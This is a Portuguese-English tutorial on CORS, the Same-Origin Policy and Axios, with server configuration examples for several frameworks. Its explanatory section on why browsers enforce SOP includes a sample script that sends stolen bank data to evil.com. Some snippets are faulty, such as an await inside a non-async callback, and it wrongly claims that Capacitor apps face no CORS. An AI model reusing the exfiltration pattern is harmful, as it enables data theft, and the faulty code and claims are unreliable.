# 🎯 Introdução

**CORS (Cross-Origin Resource Sharing)** é security mechanism implementado por browsers para controlar como web applications de uma origin (domain/protocol/port) podem acessar resources de outra origin, resolvendo fundamental Same-Origin Policy restriction que previne malicious scripts de acessar sensitive data cross-origin, enquanto permite legitimate cross-origin requests através de explicit permission system baseado em HTTP headers.

O problema fundamental que CORS resolve é **Same-Origin Policy**: browsers bloqueiam requests de `https://frontend.com` para `https://api.backend.com` porque different origins (different domains), prevenindo malicious site `evil.com` de fazer requests to `yourbank.com` usando victim's cookies. CORS permite backend explicitly permit cross-origin requests via headers como `Access-Control-Allow-Origin: https://frontend.com`.

CORS workflow envolve dois tipos de requests: **Simple requests** (GET/HEAD/POST com simple headers) são sent directly, com browser checking response headers para verificar se cross-origin request allowed; **Preflight requests** (PUT/DELETE/PATCH, custom headers, ou Content-Type não-simple) enviam OPTIONS request primeiro (preflight) para verificar server permissions antes de enviar actual request.

Critical CORS headers incluem: **Access-Control-Allow-Origin** (specifies allowed origins - `*` permite all, specific domain limita access), **Access-Control-Allow-Methods** (HTTP methods allowed - GET, POST, PUT, DELETE), **Access-Control-Allow-Headers** (custom headers allowed - Authorization, Content-Type), **Access-Control-Allow-Credentials** (permite cookies/auth headers - requires specific origin, não funciona com `*`), **Access-Control-Max-Age** (cache duration para preflight responses).

Axios CORS patterns incluem: **withCredentials: true** (sends cookies/auth headers cross-origin, requires server `Access-Control-Allow-Credentials: true`), **custom headers** triggering preflight (Authorization, X-Custom-Header), **handling preflight requests** (server must respond to OPTIONS method), **CORS errors** (browser blocks response, Axios vê network error sem details).

Common CORS scenarios: **Frontend/Backend diferentes domains** (React em `localhost:3000`, API em `localhost:8000` são different origins - different ports), **Production deployment** (Frontend em `app.example.com`, API em `api.example.com`), **CDN/Static hosting** (Static site em Vercel/Netlify, API em AWS/Heroku), **Mobile apps** (Capacitor/Ionic apps making requests to API).

CORS troubleshooting patterns: **"No 'Access-Control-Allow-Origin' header"** (server não enviou header - configure backend), **"CORS policy: credentials flag is 'include'"** (withCredentials usado mas server não enviou Allow-Credentials), **Preflight failing** (server não respondendo OPTIONS, ou não permitindo headers/methods), **Wildcard with credentials** (Access-Control-Allow-Origin: * não funciona com credentials).

Security implications: **Access-Control-Allow-Origin: \*** permite any origin acessar API (seguro para public APIs, inseguro para authenticated endpoints), **Access-Control-Allow-Credentials: true** com specific origin permite cookies cross-origin (necessário para authentication, mas increase attack surface), **Preflight caching** via Max-Age reducing requests mas pode cache outdated permissions.

Server-side CORS configuration patterns variam por framework: **Express.js** usa `cors` middleware com origin whitelist, **Spring Boot** usa `@CrossOrigin` annotations ou WebMvcConfigurer, **Django** usa django-cors-headers, **ASP.NET Core** usa CORS middleware em Startup. Todas permitem granular control sobre origins/methods/headers.

Advanced patterns incluem: **Dynamic origin validation** (checking request Origin header contra database de allowed domains), **Proxy pattern** (development proxy bypassing CORS - create-react-app proxy, Vite proxy), **CORS em production** (Nginx/CloudFlare handling CORS before reaching application), **Subdomain wildcards** (allowing *.example.com requires custom origin validation).

Este módulo explora comprehensive CORS handling: desde Same-Origin Policy fundamentals e CORS workflow (simple vs preflight requests), através de Axios CORS configuration (withCredentials, custom headers), troubleshooting common errors, até server-side configuration patterns e security best practices. Objetivo é fornecer complete understanding para securing cross-origin API communication.

---

# 📋 Sumário

### **Same-Origin Policy**
- What is SOP
- Why browsers enforce it
- Origin definition
- Security implications

### **CORS Fundamentals**
- How CORS works
- Simple requests
- Preflight requests
- CORS headers

### **Axios CORS Configuration**
- withCredentials
- Custom headers
- Handling preflight
- CORS errors

### **Common CORS Scenarios**
- Frontend/Backend separation
- Production deployment
- Development environments
- Mobile applications

### **Troubleshooting CORS**
- Missing headers
- Preflight failures
- Credentials issues
- Wildcard problems

### **Server-Side Configuration**
- Express.js CORS
- Spring Boot CORS
- Django CORS
- ASP.NET Core CORS

### **Security Best Practices**
- Origin whitelisting
- Credentials handling
- Headers control
- Attack prevention

### **Advanced Patterns**
- Dynamic origin validation
- Proxy configuration
- Production CORS
- Subdomain handling

---

# 🧠 Fundamentos

## Same-Origin Policy

### **What is SOP**

**Same-Origin Policy definition**:

Browser security mechanism que previne scripts de uma origin acessar resources de outra origin sem explicit permission. Duas URLs têm **same origin** se protocol, domain, e port são idênticos.

**Origin comparison**:

```
Base URL: https://example.com:443/page

✅ Same Origin:
- https://example.com:443/other-page (same protocol/domain/port)
- https://example.com/api/users (default HTTPS port 443)

❌ Different Origin:
- http://example.com (different protocol: http vs https)
- https://api.example.com (different domain: subdomain)
- https://example.com:8000 (different port: 8000 vs 443)
- https://other.com (completely different domain)
```

### **Why Browsers Enforce It**

**Security without SOP**:

Sem Same-Origin Policy, malicious website `evil.com` poderia:

```javascript
// User visits evil.com while logged into bank.com
// evil.com executes:

fetch('https://bank.com/api/account')
  .then(res => res.json())
  .then(data => {
    // Steal user's bank account data
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data) // Send stolen data
    });
  });

// Browser sends cookies to bank.com automatically
// evil.com reads response and steals data
```

**SOP prevention**:

Com SOP, browser bloqueia `evil.com` de reading response de `bank.com`:

```javascript
// User visits evil.com
// evil.com tries:

fetch('https://bank.com/api/account')
  .then(res => res.json()) // ❌ CORS error
  .catch(err => {
    // Error: No 'Access-Control-Allow-Origin' header
    // Browser blocked response reading
  });

// Request is SENT (cookies included)
// Response is RECEIVED by browser
// But browser BLOCKS JavaScript from reading it
```

### **Origin Definition**

**Origin components**:

```
https://api.example.com:8080/users
│       │   │           │    │
Protocol Domain         Port  Path
└───────┴───┴───────────┴────┘
         Origin
```

**Origin comparison table**:

| URL 1                          | URL 2                           | Same Origin? | Reason                    |
|--------------------------------|---------------------------------|--------------|---------------------------|
| https://example.com            | https://example.com/api         | ✅           | Protocol/domain/port same |
| https://example.com:443        | https://example.com             | ✅           | 443 is default HTTPS port |
| http://example.com             | https://example.com             | ❌           | Different protocol        |
| https://example.com            | https://api.example.com         | ❌           | Different domain          |
| https://example.com:443        | https://example.com:8080        | ❌           | Different port            |
| https://example.com/page1      | https://example.com/page2       | ✅           | Path doesn't affect origin|

### **Security Implications**

**What SOP protects**:

- **Reading responses**: JavaScript cannot read cross-origin responses
- **Cookies**: Prevents reading cookies from other domains
- **LocalStorage/SessionStorage**: Isolated per origin
- **DOM access**: iframe cannot access parent DOM if different origin

**What SOP doesn't protect**:

```javascript
// ✅ These work cross-origin (SOP doesn't block):

// 1. Images
<img src="https://other-domain.com/image.jpg" />

// 2. Scripts
<script src="https://cdn.other-domain.com/lib.js"></script>

// 3. Stylesheets
<link rel="stylesheet" href="https://other-domain.com/style.css" />

// 4. Forms (request is sent, but no response reading)
<form action="https://other-domain.com/submit" method="POST">
  <input type="text" name="data" />
</form>

// 5. fetch/XMLHttpRequest (request sent, response blocked)
fetch('https://other-domain.com/api'); // Request sent, response blocked
```

## CORS Fundamentals

### **How CORS Works**

**CORS workflow**:

```
1. Frontend (https://frontend.com) makes request to API (https://api.backend.com)

2. Browser checks: Same origin?
   - No → CORS required

3. Browser checks: Simple request?
   - Yes → Send request directly (Simple Request Flow)
   - No → Send preflight first (Preflight Flow)

4. Server responds with CORS headers:
   Access-Control-Allow-Origin: https://frontend.com

5. Browser checks: Origin allowed?
   - Yes → Allow JavaScript to read response
   - No → Block response, throw CORS error
```

**CORS headers flow**:

```javascript
// Frontend (https://app.example.com)
axios.get('https://api.backend.com/users');

// Request headers (sent by browser):
Origin: https://app.example.com

// Response headers (from server):
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization

// Browser validates: Origin matches Allow-Origin?
// ✅ Yes → JavaScript can read response
// ❌ No → CORS error
```

### **Simple Requests**

**Simple request conditions**:

Request é "simple" se ALL of:
1. Method é **GET, HEAD, ou POST**
2. Headers são apenas **simple headers** (Accept, Accept-Language, Content-Language, Content-Type)
3. Content-Type é **application/x-www-form-urlencoded, multipart/form-data, ou text/plain**

**Simple request example**:

```javascript
// ✅ Simple request (no preflight)
axios.get('https://api.backend.com/users', {
  headers: {
    'Accept': 'application/json',
    'Accept-Language': 'en-US'
  }
});

// Request flow:
// 1. Browser sends GET request directly (no preflight)
// 2. Server responds with data + CORS headers
// 3. Browser checks Access-Control-Allow-Origin
// 4. JavaScript reads response
```

**Simple POST**:

```javascript
// ✅ Simple POST
axios.post('https://api.backend.com/users', 'name=John&email=john@example.com', {
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
});

// No preflight (Content-Type is simple)
```

### **Preflight Requests**

**Preflight conditions**:

Request requires preflight if ANY of:
1. Method é **PUT, DELETE, PATCH, ou outros**
2. Usa **custom headers** (Authorization, X-Custom-Header)
3. Content-Type é **application/json** ou outros non-simple

**Preflight flow**:

```javascript
// ❌ Non-simple request (requires preflight)
axios.post('https://api.backend.com/users', 
  { name: 'John', email: 'john@example.com' },
  {
    headers: {
      'Content-Type': 'application/json', // Non-simple Content-Type
      'Authorization': 'Bearer token123'   // Custom header
    }
  }
);

// Two requests:

// 1. Preflight (OPTIONS)
OPTIONS /users HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

// Server response:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400

// 2. Actual request (POST) - only if preflight succeeds
POST /users HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Content-Type: application/json
Authorization: Bearer token123
```

**Preflight caching**:

```javascript
// Server response includes:
Access-Control-Max-Age: 86400 // Cache preflight for 24 hours

// Browser caches preflight result
// Subsequent requests to same endpoint skip preflight for 24 hours
```

### **CORS Headers**

**Response headers**:

```javascript
// Access-Control-Allow-Origin (required)
Access-Control-Allow-Origin: https://frontend.com
// Or wildcard (não funciona com credentials):
Access-Control-Allow-Origin: *

// Access-Control-Allow-Methods
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS

// Access-Control-Allow-Headers
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header

// Access-Control-Allow-Credentials (for cookies/auth)
Access-Control-Allow-Credentials: true

// Access-Control-Max-Age (preflight cache duration in seconds)
Access-Control-Max-Age: 86400

// Access-Control-Expose-Headers (custom headers JavaScript can read)
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number
```

**Request headers**:

```javascript
// Origin (sent automatically by browser)
Origin: https://frontend.com

// Preflight headers (OPTIONS request)
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

## Axios CORS Configuration

### **withCredentials**

**Enable credentials**:

```javascript
// Send cookies and auth headers cross-origin
axios.get('https://api.backend.com/users', {
  withCredentials: true
});

// Browser includes:
// - Cookies (if server domain matches)
// - HTTP authentication
// - Client-side SSL certificates
```

**Global configuration**:

```javascript
// Enable for all requests
axios.defaults.withCredentials = true;

// Now all requests include credentials
axios.get('https://api.backend.com/users'); // Includes cookies
```

**Instance configuration**:

```javascript
const apiClient = axios.create({
  baseURL: 'https://api.backend.com',
  withCredentials: true
});

// All requests via this instance include credentials
apiClient.get('/users');
apiClient.post('/users', userData);
```

**Server requirements with credentials**:

```javascript
// Server MUST respond with:
Access-Control-Allow-Origin: https://frontend.com // Specific origin (NOT *)
Access-Control-Allow-Credentials: true

// ❌ This fails with credentials:
Access-Control-Allow-Origin: * // Wildcard not allowed with credentials
Access-Control-Allow-Credentials: true
```

### **Custom Headers**

**Custom headers trigger preflight**:

```javascript
// Any non-simple header triggers OPTIONS preflight
axios.get('https://api.backend.com/users', {
  headers: {
    'Authorization': 'Bearer token123',      // Custom header
    'X-Api-Key': 'key456',                   // Custom header
    'X-Request-ID': 'request-123'            // Custom header
  }
});

// Preflight request:
OPTIONS /users
Access-Control-Request-Headers: Authorization, X-Api-Key, X-Request-ID

// Server must allow these headers:
Access-Control-Allow-Headers: Authorization, X-Api-Key, X-Request-ID
```

**Authorization header**:

```javascript
// Most common custom header
axios.get('https://api.backend.com/users', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Server must explicitly allow:
Access-Control-Allow-Headers: Authorization
```

### **Handling Preflight**

**Axios automatically handles preflight**:

```javascript
// Developer apenas configura request:
axios.post('https://api.backend.com/users',
  { name: 'John' },
  {
    headers: { 'Content-Type': 'application/json' }
  }
);

// Browser automatically:
// 1. Sends OPTIONS preflight
// 2. Waits for response
// 3. If allowed, sends actual POST
// 4. Axios receives final response
```

**Preflight interceptor** (logging):

```javascript
axios.interceptors.request.use(config => {
  // Check if request will trigger preflight
  const customHeaders = Object.keys(config.headers || {})
    .filter(h => !['Accept', 'Accept-Language', 'Content-Language', 'Content-Type'].includes(h));
  
  const nonSimpleMethods = ['PUT', 'DELETE', 'PATCH'];
  const nonSimpleContentType = config.headers['Content-Type'] === 'application/json';
  
  if (customHeaders.length > 0 || nonSimpleMethods.includes(config.method?.toUpperCase()) || nonSimpleContentType) {
    console.log('⚠️ This request will trigger CORS preflight');
  }
  
  return config;
});
```

### **CORS Errors**

**CORS error anatomy**:

```javascript
axios.get('https://api.backend.com/users')
  .catch(error => {
    // CORS errors appear as network errors
    console.error(error.message);
    // "Network Error"
    
    // No response object (browser blocked it)
    console.log(error.response); // undefined
    
    // No status code
    console.log(error.response?.status); // undefined
  });
```

**Browser console shows real error**:

```
Access to XMLHttpRequest at 'https://api.backend.com/users' 
from origin 'https://frontend.com' has been blocked by CORS policy: 
No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

**Detecting CORS errors**:

```javascript
axios.get('https://api.backend.com/users')
  .catch(error => {
    if (!error.response && error.message === 'Network Error') {
      console.error('Possible CORS error - check browser console');
      console.error('Common causes:');
      console.error('1. Server not sending Access-Control-Allow-Origin header');
      console.error('2. Origin not in server whitelist');
      console.error('3. Preflight failing (server not handling OPTIONS)');
      console.error('4. Credentials used with wildcard origin');
    }
  });
```

## Common CORS Scenarios

### **Frontend/Backend Separation**

**Development scenario**:

```javascript
// React dev server: http://localhost:3000
// Express API server: http://localhost:8000

// Different ports = different origins

// Frontend:
axios.get('http://localhost:8000/api/users');

// CORS error unless backend configured
```

**Backend configuration (Express)**:

```javascript
const cors = require('cors');

app.use(cors({
  origin: 'http://localhost:3000', // Allow React dev server
  credentials: true
}));
```

### **Production Deployment**

**Common production setup**:

```javascript
// Frontend: https://app.example.com (Vercel/Netlify)
// Backend: https://api.example.com (AWS/Heroku)

// Different subdomains = different origins

// Frontend:
const apiClient = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true
});

// Backend must allow:
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

### **Development Environments**

**Development proxy (avoiding CORS)**:

```javascript
// package.json (create-react-app)
{
  "proxy": "http://localhost:8000"
}

// Now requests to /api/users go to http://localhost:8000/api/users
// No CORS issues (same origin from browser perspective)

// Frontend:
axios.get('/api/users'); // Proxied to http://localhost:8000/api/users
```

**Vite proxy**:

```javascript
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:8000',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
};
```

### **Mobile Applications**

**Capacitor/Ionic**:

```javascript
// Mobile apps don't have same-origin restrictions
// file:// or capacitor:// protocols

// CORS headers still sent by server
// But browsers don't enforce CORS for mobile apps

axios.get('https://api.backend.com/users');
// Works without CORS configuration
```

## Troubleshooting CORS

### **Missing Headers**

**Error**: "No 'Access-Control-Allow-Origin' header"

**Cause**: Server não enviou CORS header

**Solution**:

```javascript
// Backend (Express)
app.use(cors({
  origin: 'https://frontend.com'
}));

// Or manual:
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://frontend.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
```

### **Preflight Failures**

**Error**: "Response to preflight request doesn't pass access control check"

**Cause**: Server não respondendo OPTIONS request

**Solution**:

```javascript
// Backend must handle OPTIONS
app.options('*', cors()); // Enable preflight for all routes

// Or manually:
app.options('/api/users', (req, res) => {
  res.header('Access-Control-Allow-Origin', 'https://frontend.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.sendStatus(204);
});
```

### **Credentials Issues**

**Error**: "credentials flag is 'include'"

**Cause**: withCredentials usado mas server não configurado

**Solution**:

```javascript
// Frontend:
axios.get('https://api.backend.com/users', {
  withCredentials: true
});

// Backend MUST send:
Access-Control-Allow-Origin: https://frontend.com // Specific origin (NOT *)
Access-Control-Allow-Credentials: true
```

### **Wildcard Problems**

**Error**: "cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true"

**Cause**: `Access-Control-Allow-Origin: *` com `withCredentials: true`

**Solution**:

```javascript
// ❌ Doesn't work:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// ✅ Use specific origin:
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Credentials: true

// Or dynamic origin (Express):
app.use(cors({
  origin: (origin, callback) => {
    const allowedOrigins = ['https://frontend.com', 'https://app.example.com'];
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

## Server-Side Configuration

### **Express.js CORS**

**Basic setup**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// Enable CORS for all routes
app.use(cors({
  origin: 'https://frontend.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400 // Preflight cache: 24 hours
}));

app.get('/api/users', (req, res) => {
  res.json([{ id: 1, name: 'John' }]);
});

app.listen(8000);
```

**Multiple origins**:

```javascript
const allowedOrigins = [
  'https://frontend.com',
  'https://app.example.com',
  'http://localhost:3000'
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

### **Spring Boot CORS**

**@CrossOrigin annotation**:

```java
@RestController
@RequestMapping("/api/users")
@CrossOrigin(
    origins = "https://frontend.com",
    allowedHeaders = {"Content-Type", "Authorization"},
    methods = {RequestMethod.GET, RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE},
    allowCredentials = "true",
    maxAge = 86400
)
public class UserController {
    
    @GetMapping
    public List<User> getUsers() {
        return userService.findAll();
    }
}
```

**Global configuration**:

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("https://frontend.com")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("Content-Type", "Authorization")
                .allowCredentials(true)
                .maxAge(86400);
    }
}
```

### **Django CORS**

**django-cors-headers**:

```python
# settings.py
INSTALLED_APPS = [
    'corsheaders',
    # ...
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',
    'django.middleware.common.CommonMiddleware',
    # ...
]

CORS_ALLOWED_ORIGINS = [
    'https://frontend.com',
    'https://app.example.com',
    'http://localhost:3000',
]

CORS_ALLOW_CREDENTIALS = True

CORS_ALLOW_HEADERS = [
    'content-type',
    'authorization',
    'x-api-key',
]
```

### **ASP.NET Core CORS**

**Startup configuration**:

```csharp
public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        services.AddCors(options =>
        {
            options.AddPolicy("AllowFrontend",
                builder =>
                {
                    builder.WithOrigins("https://frontend.com")
                           .AllowAnyMethod()
                           .AllowAnyHeader()
                           .AllowCredentials()
                           .SetPreflightMaxAge(TimeSpan.FromDays(1));
                });
        });
        
        services.AddControllers();
    }
    
    public void Configure(IApplicationBuilder app)
    {
        app.UseCors("AllowFrontend");
        
        app.UseRouting();
        app.UseEndpoints(endpoints =>
        {
            endpoints.MapControllers();
        });
    }
}
```

## Security Best Practices

### **Origin Whitelisting**

**Never use wildcard for sensitive APIs**:

```javascript
// ❌ Bad (allows any origin)
Access-Control-Allow-Origin: *

// ✅ Good (specific origins)
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com'
];

app.use(cors({
  origin: (origin, callback) => {
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
}));
```

### **Credentials Handling**

**Minimize credential usage**:

```javascript
// Use credentials only when necessary
axios.get('/public/data'); // No credentials needed

axios.get('/user/profile', {
  withCredentials: true // Only for authenticated endpoints
});
```

### **Headers Control**

**Limit exposed headers**:

```javascript
// Backend
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  // Don't allow arbitrary headers
  
  res.header('Access-Control-Expose-Headers', 'X-Total-Count');
  // Only expose necessary headers
  
  next();
});
```

### **Attack Prevention**

**Validate origin dynamically**:

```javascript
app.use(cors({
  origin: (origin, callback) => {
    // Check origin against database or configuration
    const allowedOrigins = await db.getAllowedOrigins();
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      // Log suspicious request
      logger.warn(`CORS blocked: ${origin}`);
      callback(new Error('Not allowed by CORS'));
    }
  }
}));
```

## Advanced Patterns

### **Dynamic Origin Validation**

**Database-driven whitelist**:

```javascript
const getAllowedOrigins = async () => {
  return await db.query('SELECT origin FROM allowed_origins');
};

app.use(cors({
  origin: async (origin, callback) => {
    const allowedOrigins = await getAllowedOrigins();
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
}));
```

### **Proxy Configuration**

**Nginx CORS proxy**:

```nginx
server {
    listen 80;
    server_name api.example.com;
    
    location / {
        # CORS headers
        add_header Access-Control-Allow-Origin https://frontend.com always;
        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
        add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
        add_header Access-Control-Allow-Credentials true always;
        
        # Handle preflight
        if ($request_method = OPTIONS) {
            return 204;
        }
        
        proxy_pass http://backend:8000;
    }
}
```

### **Production CORS**

**Environment-based configuration**:

```javascript
const allowedOrigins = process.env.NODE_ENV === 'production'
  ? ['https://app.example.com', 'https://admin.example.com']
  : ['http://localhost:3000', 'http://localhost:3001'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true
}));
```

### **Subdomain Handling**

**Wildcard subdomain validation**:

```javascript
app.use(cors({
  origin: (origin, callback) => {
    // Allow *.example.com
    const pattern = /^https:\/\/[\w-]+\.example\.com$/;
    
    if (origin && pattern.test(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

---

# 🎯 Aplicabilidade

## Quando CORS é Necessário

**Frontend/Backend Separation**: React/Vue/Angular frontend consumindo API separada.

**Microservices**: Services comunicando cross-origin.

**Third-Party APIs**: Accessing external APIs from browser.

## Trade-offs

**Security**: CORS adiciona security layer, mas configuração incorreta pode expor vulnerabilities.

**Performance**: Preflight requests adicionam latency (mitigated via caching).

**Complexity**: Debugging CORS errors requer understanding de browser behavior.

---

# ⚠️ Limitações

## Browser Enforcement

CORS é browser security mechanism - não protege contra:

**Server-to-Server**: Backend requests bypass CORS.

**Postman/cURL**: Tools não enforce CORS.

**Mobile Apps**: Native apps não têm same-origin restrictions.

## Preflight Overhead

Preflight requests adicionam round-trip latency:

**Solution**: Preflight caching via `Access-Control-Max-Age`.

---

# 🔗 Interconexões

## Authentication

CORS com credentials essential para authentication flows.

## API Gateways

Centralized CORS configuration em gateway layer.

## CDN/Reverse Proxy

CloudFlare/Nginx handling CORS before application.

---

# 🚀 Evolução

## CORP (Cross-Origin Resource Policy)

Stricter control over resource loading.

## COEP (Cross-Origin Embedder Policy)

Controls embedding cross-origin resources.

## Trusted Types

Preventing DOM-based XSS attacks.

---

**Conclusão Integrada**: CORS (Cross-Origin Resource Sharing) é security mechanism controlando cross-origin resource access via explicit permission system baseado em HTTP headers, resolvendo Same-Origin Policy restrictions que previnem malicious cross-origin data theft enquanto allowing legitimate cross-origin communication. **Same-Origin Policy** define origin como protocol+domain+port triplet (`https://example.com:443` different de `http://example.com` ou `https://api.example.com`), blocking JavaScript de reading cross-origin responses to prevent malicious sites stealing data via automatic cookie inclusion. **CORS workflow**: browser checks same origin → if different, checks simple request (GET/HEAD/POST + simple headers + simple Content-Type) → sends directly ou sends OPTIONS preflight first (PUT/DELETE/PATCH, custom headers, application/json) → validates server response headers (`Access-Control-Allow-Origin`, `Allow-Methods`, `Allow-Headers`, `Allow-Credentials`, `Max-Age`) → allows/blocks response reading. **Axios CORS configuration**: **withCredentials: true** sends cookies/auth cross-origin requiring server `Allow-Credentials: true` + specific origin (wildcard fails), **custom headers** (Authorization, X-Api-Key) triggering preflight requiring server `Allow-Headers`, **CORS errors** appearing as Network Error sem response object (browser blocks before Axios sees it). **Common scenarios**: **frontend/backend separation** (React localhost:3000 → API localhost:8000 = different ports = CORS needed), **production deployment** (app.example.com → api.example.com = different subdomains = CORS needed), **development proxy** (package.json proxy bypassing CORS via same-origin illusion). **Troubleshooting patterns**: **missing headers** (server não enviou Allow-Origin - configure backend CORS middleware), **preflight failures** (server não handling OPTIONS - add OPTIONS handler), **credentials issues** (withCredentials + wildcard origin - use specific origin), **wildcard problems** (Access-Control-Allow-Origin: * incompatible com credentials). **Server-side configuration**: **Express** via cors middleware com origin whitelist/callback, **Spring Boot** via @CrossOrigin annotation ou WebMvcConfigurer, **Django** via django-cors-headers, **ASP.NET Core** via CORS policy em Startup. **Security best practices**: **origin whitelisting** (never wildcard for sensitive APIs - validate against database/config), **credentials minimization** (only authenticated endpoints), **headers control** (limit Allow-Headers/Expose-Headers), **dynamic validation** (check origin against database, log suspicious requests). **Advanced patterns**: **dynamic origin validation** (database-driven whitelist), **proxy configuration** (Nginx adding CORS headers before application), **subdomain wildcards** (regex validation para *.example.com pattern), **environment-based config** (different origins for development/production). Critical understanding: CORS protects users from malicious sites, not servers from malicious requests (requests are sent, responses blocked); CORS is browser enforcement (Postman/cURL/server-to-server bypass CORS); preflight caching via Max-Age reduces overhead; wildcard origin incompatible com credentials; proper configuration essential para security (misconfiguration exposes vulnerabilities).